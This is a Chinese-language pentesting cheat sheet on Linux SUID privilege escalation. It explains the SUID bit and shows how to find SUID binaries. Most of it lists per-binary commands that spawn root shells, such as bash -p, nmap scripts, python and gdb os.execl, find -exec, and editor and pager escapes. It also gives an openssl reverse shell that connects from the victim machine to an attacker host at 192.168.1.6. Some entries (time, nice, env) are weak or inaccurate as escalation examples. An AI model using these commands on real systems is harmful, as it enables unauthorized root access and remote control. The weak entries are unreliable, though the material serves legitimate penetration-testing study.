# Linux SUID 提权

发现了一个非常有用的项目: [GTFOBins](https://gtfobins.github.io/)

GTFOBins 是一个非常有用的项目，它提供了一些 Linux 系统上的 SUID 提权方法。它的目的是为了帮助渗透测试人员在 Linux 系统上提权。

有了上面的项目，你可以忽略本文了。哈哈:) 本文罗列了一些我在渗透测试中遇到的 SUID 提权方法。

*同类还有个 Windows 提权的项目: [LOLBAS](https://lolbas-project.github.io/)*

## SUID

SUID (Set UID)是 Linux 中的一种特殊权限。用户运行某个程序时，若该程序有 SUID 权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是 SUID 权限的设置只针对二进制可执行文件（对应 windows 下的 exe 文件），对于非可执行文件设置 SUID 没有意义。

在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。

通俗的来讲，假设我们现在有一个可执行文件 `/bin/find`，其属主为 root。当我们通过非 root 用户登录时，如果 `find` 命令设置了 SUID 权限且属主为 root，而恰好 `find` 命令能通过 `-exec` 选项执行系统命令，我们可在非 root 用户下运行 `find` 执行命令，在执行文件时，该进程的权限将为 root 权限。达到提权的效果。利用此特性，我们可以实现利用 SUID 权限的特殊进行提权。

## SUID 的设置

```bash
chmod u+s filename   设置SUID位
chmod u-s filename   去掉SUID设置
```

`u` 代表文件所属者，suid 权限是针对文件所属者而言的，只能对其所属者设置

## 找到 SUID 文件

首先通过 `find` 命令查找当前系统上文件属主为 root 并且拥有 SUID 权限的可执行文件，方法如下

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

-user 指定文件拥有者
-perm 文件权限
-exec 执行系统命令
```

例子：

```bash
$ find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

## 可利用 SUID 提权的命令

### bash

```bash
bash -p
```

### csh

```bash
csh -b
```

### nmap

- [x] nmap 2.02 - 5.21

```bash title="旧版"
nmap --interactive
nmap> !sh
sh-3.2# whoami
root
```

```bash title="新版"
echo "os.execute('/bin/bash -p')" > /tmp/shell.nse
nmap --script=/tmp/shell.nse 127.0.0.1
```

### openssl

```bash title="攻击者机器"
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
```

```bash title="被攻击者机器"
RHOST=192.168.1.6

RPORT=12345

mkfifo /tmp/s; /bin/sh -p -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
```

### php

```bash
CMD="/bin/sh"

php -r "pcntl_exec('/bin/sh', ['-p']);"
```

### python

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### rpm

```bash
rpm --eval '%{lua:os.execute("/bin/sh -p")}'
```

### rsync

```bash
rsync -e 'sh -p -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null
```

### ssh

```bash
ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x
```

### xargs

```bash
xargs -a /dev/null sh -p
```

### docker

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### expect

```
expect -c 'spawn /bin/sh -p;interact'
```

### find

利用的 `find` 命令的 `-exec` 选项，该选项可以执行系统命令，而且可以使用 `{}` 代表当前文件名。

```bash
find . -exec /bin/sh -p \; -quit
  -exec：<执行指令>：假设find指令的回传值为True，就执行该指令；
  \;：结束符号，表示结束-exec的指令；
  -quit：结束find指令的执行；
```

但是现在很多系统上 `find` 命令默认没有设置 SUID 权限，所以需要手动设置。如果没有 SUID 权限就没法利用了。

```bash
[root@localhost ~]# ls -l /usr/bin/find
-rwxr-xr-x. 1 root root 199304 Oct 31  2018 /usr/bin/find
[root@localhost ~]# chmod u+s /usr/bin/find
```

### date

`date` 是一个用来显示或设置系统时间的命令，但是它也可以用来执行系统命令。

```bash
date -f/--file <filename>

-f, --file=DATEFILE：类似于--date; 一次从DATEFILE处理一行。
```

### Vim

vi, vim, vim.tiny, vim-basic 同样适用

进入 vim 命令行模式，感叹号后面加命令即可执行

```bash
!command
>!whoami
>kali
```

### ftp

```bash
ftp
!/bin/sh -p
```

### gdb

```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

### git

```bash
git help status
!/bin/sh -p
```

### man

```bash
man man
!/bin/sh -p
```

### ed

`ed` 命令是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。
命令行模式执行命令

```bash
ed
!whoami
kali
```

### less / more

`more` 和 `less` 一定要读取一个比较长的文件，如果文件太短无法进入翻页功能也就无法使用!命令执行命令或者进入 shell

```bash
less /var/log/dmesg
!/bin/sh
sh-4.2$ whoami
kk
```

### awk

`awk` 是一种编程语言，它可以用来处理文本文件，也可以用来执行系统命令。

```bash
awk 'BEGIN {system("whoami")}'
```

### time

`time` 命令可以用来执行系统命令。

```bash
time whoami
```

### dmesg

`dmesg` 命令可以用来查看内核信息，也可以用来执行系统命令。

```bash
dmesg -H
!whoami
kk
```

### env

`env` 用来显示系统中已存在的环境变量，也可以用来执行系统命令。

```bash
env ifconfig
```

### flock

`flock` 是 Linux 的文件锁命令。可以通过一个锁文件，来控制在 shell 中逻辑的互斥性。也可以用来执行系统命令。

```bash
flock -u ifconfig
```

### ionice

`ionice` 命令用来获取或设置进程的 I/O 调度与优先级，也可以用来执行系统命令。

```bash
ionice whoami
```

### nice

`nice` 命令用来改变进程的优先级，也可以用来执行系统命令。

```bash
nice whoami
```

### strace

`strace` 命令用来跟踪进程的系统调用，也可以用来执行系统命令。

```bash
strace -o /dev/null whoami
```

## 参考

- [利用suid提权获取CentOS系统Root Shell](https://www.secrss.com/articles/28493)
- [2022蓝帽杯遇见的 SUID 提权 总结篇](https://tttang.com/archive/1793/)
